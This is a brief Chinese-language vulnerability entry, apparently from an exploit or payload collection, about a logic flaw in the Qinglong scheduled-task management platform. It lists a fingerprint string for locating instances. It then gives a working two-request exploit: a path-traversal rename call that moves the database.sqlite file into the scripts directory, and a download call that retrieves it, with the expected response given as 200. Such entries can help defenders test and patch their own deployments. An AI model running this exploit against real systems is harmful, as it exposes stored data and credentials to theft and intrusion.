# 青龙定时任务管理平台rename存在逻辑缺陷漏洞

- **系统**：青龙定时任务管理平台　|　**类型**：逻辑缺陷　|　**CVE**：—
- **指纹**：`body="./umi.a4d14b92.css"`
- **请求**：`PUT /Api/scripts/rename HTTP/1.1`
- **关键头**：`Content-Type: application/json`

**请求体 / payload**
```
"path": "../db/",
"filename": "database.sqlite",
"newFilename": "../scripts/hacked_db.sqlite"
POST /Api/scripts/download HTTP/1.1
Host:
Content-Type: application/json
"path": "",
"filename": "hacked_db.sqlite"
```
- **预期**：200　|　—